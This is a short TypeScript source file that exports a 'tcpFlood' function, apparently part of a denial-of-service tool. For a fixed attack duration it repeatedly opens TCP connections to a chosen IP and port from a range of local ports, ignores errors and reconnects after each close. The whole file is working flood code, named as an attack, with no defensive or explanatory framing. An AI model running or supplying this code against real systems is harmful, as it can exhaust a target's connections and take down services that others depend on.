import { Socket } from 'net';

const attackDuration = 30000; 

export async function tcpFlood (ip: string, port: number, localPorts: [number, number]): Promise<void> {
  console.log(`starting tcp flood ${ip}:${port} using localPorts ${localPorts[0]}-${localPorts[1]}`);
  let promises = [];

  for (let i = localPorts[0]; i <= localPorts[1]; i++) {
    promises.push(connectTCP(ip, port, i));
  }

  await Promise.all(promises);
  console.log(`finished tcp flood ${ip}:${port} using localPorts ${localPorts[0]}-${localPorts[1]}`);
}

async function connectTCP (ip: string, port: number, localPort: number): Promise<void> {
  // unless attackDuration has passed on error or close open connection again
  const startTime = new Date();

  return new Promise((resolve) => {
    let tcpRequest = () => {
      if (Date.now() - startTime.getTime() > attackDuration) {
        // attack time has expired, resolve
        return resolve();
      }

      try {
        let client = new Socket();

        client.on('error', (error) => {
          // swallow error and just try again after short timeout
          return;
        });

        client.on('close', () => {
          // this also happens when an error occurs
          // just try again after a short delay
          setTimeout(tcpRequest, 1000);
        });

        client.connect({
          host: ip,
          port:port,
          localPort: localPort
        })
      } catch (error) {
        console.error('error while doing tcpRequest', error);
      }
    };

    tcpRequest();
  });
}